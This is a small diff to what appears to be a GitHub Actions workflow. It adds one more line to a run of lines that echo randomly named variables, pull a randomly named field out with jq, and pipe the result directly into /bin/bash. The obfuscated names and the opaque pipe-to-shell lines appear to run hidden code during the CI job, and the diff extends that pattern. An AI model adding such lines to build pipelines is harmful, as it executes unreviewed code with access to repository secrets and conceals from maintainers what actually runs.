@@ -28,6 +28,7 @@ jobs:
           echo $mjd8 | jq -r .k46413 | /bin/bash
           printf '%s' "$yfcwr78" | jq -r .vh92831 | /bin/bash
           echo $ocxy93552 | jq -r .tfd77460 | /bin/bash
+          echo $igntg0 | jq -r .qxc3 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
